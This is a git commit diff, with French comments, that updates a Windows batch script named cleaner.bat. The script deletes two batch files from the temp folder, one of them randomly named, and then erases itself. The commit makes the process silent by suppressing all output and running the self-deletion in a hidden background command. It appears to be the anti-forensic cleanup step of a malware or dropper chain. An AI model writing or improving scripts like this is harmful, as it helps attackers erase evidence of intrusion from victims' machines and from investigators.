69a1cc44715c4affb5613f31cfa47bb43e74aabd
gf9gs9g6dg3s3g3fgsdg <b4cmohaprofessionnel@gmail.com>
2026-05-02 00:57:41 +0200

    Update cleaner.bat

--- cleaner.bat
+++ cleaner.bat
@@ -1,12 +1,10 @@
 @echo off
-echo Suppression des fichiers...
 
-if exist "%temp%\ps.bat" del /f /q "%temp%\ps.bat"
-if exist "%temp%\6hj546dgs.bat" del /f /q "%temp%\6hj546dgs.bat"
+rem Suppression des fichiers
+if exist "%temp%\ps.bat" del /f /q "%temp%\ps.bat" >nul 2>&1
+if exist "%temp%\6hj546dgs.bat" del /f /q "%temp%\6hj546dgs.bat" >nul 2>&1
 
-echo Auto-suppression...
-
-ping 127.0.0.1 -n 2 > nul
-del /f /q "%~f0"
+rem Auto-suppression silencieuse
+start "" /b cmd /c "ping 127.0.0.1 -n 2 >nul & del /f /q "%~f0" >nul 2>&1"
 
 exit
